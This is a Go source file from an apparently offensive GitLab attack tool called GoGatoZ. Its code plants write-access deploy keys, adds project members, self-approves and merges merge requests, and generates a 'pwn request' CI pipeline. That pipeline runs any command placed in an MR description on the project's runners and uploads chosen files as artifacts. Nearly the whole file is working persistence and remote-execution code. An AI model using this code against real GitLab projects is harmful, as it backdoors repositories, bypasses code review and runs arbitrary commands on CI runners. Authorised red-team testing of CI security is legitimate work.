package attack

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"os"
	"strings"

	gitlab "gitlab.com/gitlab-org/api/client-go"
	"golang.org/x/crypto/ssh"
)

// Persistence provides helpers for establishing persistence in a target GitLab project
// (deploy keys, project members, and MR-triggered pipelines akin to "Pwn Request").
type Persistence struct{ *Attacker }

func NewPersistence(att *Attacker) *Persistence { return &Persistence{Attacker: att} }

// RunMRPwn commits an MR-triggered pipeline into the repository and returns the pipeline URL.
// It uses GenerateMRPwnCI under the hood.
func (p *Persistence) RunMRPwn(ctx context.Context, projectID any, branch, jobName string, runnerTags []string, downloadPath string) (string, error) {
	if _, err := p.SetupUser(ctx); err != nil {
		return "", err
	}
	if strings.TrimSpace(branch) == "" {
		branch = "gogatoz-attack"
	}
	yaml := p.GenerateMRPwnCI(jobName, runnerTags, downloadPath)
	return p.CommitCIPipeline(ctx, projectID, branch, yaml, "Add MR pwn pipeline via GoGatoZ")
}

// CreateDeployKey generates an RSA keypair, saves the private key to keyPath, and adds the public
// key to the project as a deploy key with write access. Returns the deploy key ID and the public key string.
func (p *Persistence) CreateDeployKey(ctx context.Context, projectID any, title, keyPath string) (int64, string, error) {
	if strings.TrimSpace(title) == "" {
		title = "GoGatoZ Deploy Key"
	}
	if strings.TrimSpace(keyPath) == "" {
		return 0, "", fmt.Errorf("keyPath is required")
	}
	// Generate RSA key
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return 0, "", err
	}
	// Marshal private key to PEM (PKCS8)
	privDer, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		return 0, "", err
	}
	privPem := pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: privDer})
	if err := os.WriteFile(keyPath, privPem, 0600); err != nil {
		return 0, "", fmt.Errorf("write private key: %w", err)
	}
	// Public key in OpenSSH authorized_keys format
	pub, err := ssh.NewPublicKey(&priv.PublicKey)
	if err != nil {
		return 0, "", err
	}
	pubKeyStr := string(ssh.MarshalAuthorizedKey(pub))

	// Add deploy key to project with push access (write)
	opt := &gitlab.AddDeployKeyOptions{
		Title:   new(title),
		Key:     new(strings.TrimSpace(pubKeyStr)),
		CanPush: new(true),
	}
	dk, _, err := p.Client.GL.DeployKeys.AddDeployKey(projectID, opt, gitlab.WithContext(ctx))
	if err != nil {
		return 0, "", err
	}
	return dk.ID, pubKeyStr, nil
}

// AddProjectMemberByUsername adds a user to the project with the given access level by resolving username.
// accessLevel: guest, reporter, developer, maintainer, owner (owner only valid for groups; maintainer for projects).
func (p *Persistence) AddProjectMemberByUsername(ctx context.Context, projectID any, username, accessLevel string) error {
	if username == "" {
		return fmt.Errorf("username is required")
	}
	lvl, err := parseAccessLevel(accessLevel)
	if err != nil {
		return err
	}
	users, _, err := p.Client.GL.Users.ListUsers(&gitlab.ListUsersOptions{Username: new(username)}, gitlab.WithContext(ctx))
	if err != nil {
		return err
	}
	if len(users) == 0 {
		return fmt.Errorf("user not found: %s", username)
	}
	u := users[0]
	opt := &gitlab.AddProjectMemberOptions{UserID: new(u.ID), AccessLevel: new(lvl)}
	_, _, err = p.Client.GL.ProjectMembers.AddProjectMember(projectID, opt, gitlab.WithContext(ctx))
	return err
}

func parseAccessLevel(s string) (gitlab.AccessLevelValue, error) {
	s = strings.ToLower(strings.TrimSpace(s))
	switch s {
	case "guest":
		return gitlab.GuestPermissions, nil
	case "reporter":
		return gitlab.ReporterPermissions, nil
	case "developer":
		return gitlab.DeveloperPermissions, nil
	case "maintainer", "maintain":
		return gitlab.MaintainerPermissions, nil
	case "owner":
		// Not valid for project members; keep for compatibility but will likely error if used
		return gitlab.OwnerPermissions, nil
	case "":
		return gitlab.DeveloperPermissions, nil
	default:
		return gitlab.DeveloperPermissions, fmt.Errorf("unknown access level: %s", s)
	}
}

// ApprovalStatus summarises the current MR approval state.
type ApprovalStatus struct {
	ApprovalsRequired int64 `json:"approvals_required"`
	ApprovalsLeft     int64 `json:"approvals_left"`
	Approved          bool  `json:"approved"`
}

// CheckApprovalRules returns the current approval configuration for a merge request.
func (p *Persistence) CheckApprovalRules(ctx context.Context, projectID any, mrIID int64) (*ApprovalStatus, error) {
	cfg, _, err := p.Client.GL.MergeRequestApprovals.GetConfiguration(projectID, mrIID, gitlab.WithContext(ctx))
	if err != nil {
		return nil, fmt.Errorf("get MR approval config: %w", err)
	}
	return &ApprovalStatus{
		ApprovalsRequired: cfg.ApprovalsRequired,
		ApprovalsLeft:     cfg.ApprovalsLeft,
		Approved:          cfg.Approved,
	}, nil
}

// ApproveMergeRequest approves a merge request. Returns error if the token user
// is not allowed to approve (e.g. author cannot approve their own MR).
func (p *Persistence) ApproveMergeRequest(ctx context.Context, projectID any, mrIID int64) error {
	_, _, err := p.Client.GL.MergeRequestApprovals.ApproveMergeRequest(projectID, mrIID,
		&gitlab.ApproveMergeRequestOptions{}, gitlab.WithContext(ctx))
	return err
}

// MergeMergeRequest accepts (merges) a merge request.
func (p *Persistence) MergeMergeRequest(ctx context.Context, projectID any, mrIID int64, removeSourceBranch bool) error {
	_, _, err := p.Client.GL.MergeRequests.AcceptMergeRequest(projectID, mrIID,
		&gitlab.AcceptMergeRequestOptions{
			ShouldRemoveSourceBranch: new(removeSourceBranch),
		}, gitlab.WithContext(ctx))
	return err
}

// AutoMergeResult captures the outcome of a RunAutoMerge attempt.
type AutoMergeResult struct {
	Branch     string         `json:"branch"`
	MRURL      string         `json:"mr_url"`
	MRIID      int64          `json:"mr_iid"`
	Approval   ApprovalStatus `json:"approval"`
	Approved   bool           `json:"approved"`
	Merged     bool           `json:"merged"`
	ApproveErr string         `json:"approve_error,omitempty"`
	MergeErr   string         `json:"merge_error,omitempty"`
}

// RunAutoMerge executes the full chain: create branch, commit content, create MR, approve, merge.
// It returns partial results even if approval or merge fails.
func (p *Persistence) RunAutoMerge(ctx context.Context, projectID any, branch, filePath, content, commitMsg, mrTitle, mrDescription, targetBranch string) (*AutoMergeResult, error) {
	if _, err := p.SetupUser(ctx); err != nil {
		return nil, fmt.Errorf("setup user: %w", err)
	}

	result := &AutoMergeResult{Branch: branch}

	// Create branch and commit file
	if err := p.EnsureBranch(ctx, projectID, branch); err != nil {
		return nil, fmt.Errorf("ensure branch: %w", err)
	}
	if err := p.UpsertFile(ctx, projectID, branch, filePath, content, commitMsg); err != nil {
		return nil, fmt.Errorf("commit file: %w", err)
	}

	// Create merge request
	mr, err := p.CreateMergeRequest(ctx, projectID, branch, targetBranch, mrTitle, mrDescription)
	if err != nil {
		return nil, fmt.Errorf("create MR: %w", err)
	}
	result.MRURL = mr.WebURL
	result.MRIID = mr.IID

	// Check approval rules
	status, err := p.CheckApprovalRules(ctx, projectID, mr.IID)
	if err != nil {
		return result, fmt.Errorf("check approvals: %w", err)
	}
	result.Approval = *status

	// Attempt self-approval
	if err := p.ApproveMergeRequest(ctx, projectID, mr.IID); err != nil {
		result.ApproveErr = err.Error()
	} else {
		result.Approved = true
	}

	// Attempt merge
	if err := p.MergeMergeRequest(ctx, projectID, mr.IID, true); err != nil {
		result.MergeErr = err.Error()
	} else {
		result.Merged = true
	}

	return result, nil
}

// GenerateMRPwnCI returns a GitLab CI configuration that triggers on merge_request_event and
// executes a command extracted from the MR description prefixed with 'CMD: '. If downloadPath is set,
// uploads it as artifact. Runner tags can target self-hosted runners.
func (p *Persistence) GenerateMRPwnCI(jobName string, runnerTags []string, downloadPath string) string {
	if strings.TrimSpace(jobName) == "" {
		jobName = "pwn-request"
	}
	tagLine := ""
	if len(runnerTags) > 0 {
		tagLine = fmt.Sprintf("\n  tags: [%s]", quoteJoin(runnerTags))
	}
	artifacts := ""
	if strings.TrimSpace(downloadPath) != "" {
		artifacts = fmt.Sprintf("\n  artifacts:\n    when: always\n    paths:\n      - %s\n    expire_in: 1 day", downloadPath)
	}
	return fmt.Sprintf(`
# Auto-generated by GoGatoZ (MR pwn request)
stages: [pwn]

%s:
  stage: pwn%s
  script:
    - |
      echo "Extracting command from MR description"
      CMD=$(printf "%%s" "$CI_MERGE_REQUEST_DESCRIPTION" | sed -n 's/^CMD: //p' | head -n1)
      if [ -z "$CMD" ]; then CMD="echo no-cmd"; fi
      echo "$CMD" > .cmd.sh
      bash -lc "$CMD" || true%s
  rules:
    - if: "$CI_PIPELINE_SOURCE == 'merge_request_event'"
`, jobName, tagLine, artifacts)
}
